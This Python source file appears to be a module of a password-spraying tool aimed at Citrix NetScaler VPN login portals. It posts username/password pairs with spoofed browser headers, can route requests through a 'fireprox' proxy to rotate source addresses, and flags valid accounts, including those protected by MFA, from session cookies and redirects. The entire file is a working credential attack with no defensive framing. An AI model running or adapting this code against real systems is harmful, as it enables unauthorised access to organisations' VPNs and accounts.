#!/usr/bin/env python3

import requests, warnings
# This is to suppress the insecure warning. If there is a better way please let me know
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore',InsecureRequestWarning)

'''Function for password spraying against Netscaler portal'''
def citrix_conn(params):

    username = params.get("username")
    password = params.get("password")
    count = params.get("count")
    place = params.get("place")
    filelogger = params.get("filelogger")
    fprox = params.get("url")

    if params.get("url"):
        citrixurl = fprox.split('/')[2]
        posturl = 'https://' + citrixurl + '/fireprox/cgi/login'
    else:    
        citrixurl = ''.join(params.get("host"))
        posturl = 'https://' + citrixurl + '/cgi/login'
        
    originurl = 'https://' + citrixurl
    citrixendpt = 'https://' + citrixurl + '/vpn/index.html'

    headers = {
        'Host': citrixurl,
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '64',
        'Origin': originurl,
        'DNT': '1',
        'Connection': 'close',
        'Referer': citrixendpt,
        'Upgrade-Insecure-Requests': '1'
    }

    data = "login={}&dummy_username=&dummy_pass1=&passwd={}".format(username,password)
    try:

        # print the host , username and password being checked
        print(f"ACCOUNT CHECK: [Citrix] Target: {citrixurl} User: {username} [{place} of {count}, {place} completed] Password: {password}")

        query = requests.post(
            posturl, data=data, headers=headers, allow_redirects=True)    
        
        if query.status_code == 200:
                if 'NSC_USER={}'.format(username) in query.headers['Set-Cookie']:
                    print(f"ACCOUNT FOUND: [Citrix] Target: {citrixurl} User: {username} Password: {password} [SUCCESS - MFA Enabled]")
                    if filelogger != None:
                        filelogger.debug(f"ACCOUNT FOUND: [Citrix] Target: {citrixurl} User: {username} Password: {password} [SUCCESS - MFA Enabled]")

        else:
            for resp in query.history:
                if resp.status_code == 302:
                    if resp.headers['Location'] == '/cgi/setclient?cvpn':
                        print(f"ACCOUNT FOUND: [Citrix] Target: {citrixurl} User: {username} Password: {password} [SUCCESS]")
                        if filelogger != None:
                            filelogger.debug(f"ACCOUNT FOUND: [Citrix] Target: {citrixurl} User: {username} Password: {password} [SUCCESS]")
                elif query.status_code != 401:
                    print(f"The Header Respose code to investigate: {query.status_code}")

    except:
        pass
